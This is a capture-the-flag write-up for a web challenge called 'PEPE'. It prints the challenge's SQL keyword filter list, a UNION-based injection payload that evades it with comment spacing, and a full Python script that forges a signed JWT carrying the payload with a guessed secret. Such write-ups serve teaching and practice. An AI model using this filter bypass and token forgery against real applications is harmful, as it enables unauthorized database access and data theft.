## Title

PEPE

## Description

Can you bypass my filters ?

Authors: S1mple & Achux21
http://45.129.40.107:9669/ 


## Solution

Basically we need to bypass the following filter list that is used in the username:
`filters=[">", "+","=", "<","//", "|","'1", " 1", " true", "'true", " or", "'or", "/or",";", " ", " " ," and", "'and", "/and", "'like", " like", "%00", "null", "admin'","/like", "'where", " where", "/where"]`

We needed to bypass the filters in order to inject SQL in the JWT token and read the flag that is in here: `cursor.execute(f"INSERT INTO flag (flag) VALUES ('{flag}');")`

The following payload does it: `nonexist'union/**/select(flag)from(flag)--`

Here is the script to create the token:

```py
import base64
import hmac
import hashlib
import json

# Define the header and payload
header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "username": "nonexist'union/**/select(flag)from(flag)--",
    "password": "irrelevant",
    "exp": 1716653571
}

# Function to base64url encode
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Encode the header and payload
encoded_header = base64url_encode(json.dumps(header).encode('utf-8'))
encoded_payload = base64url_encode(json.dumps(payload).encode('utf-8'))

# Create the unsigned token
unsigned_token = f"{encoded_header}.{encoded_payload}"

# Sign the token
secret = 'secret'  # Replace with the actual secret used by the application
signature = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha256).digest()
encoded_signature = base64url_encode(signature)

# Create the final token
jwt_token = f"{unsigned_token}.{encoded_signature}"

print(jwt_token)
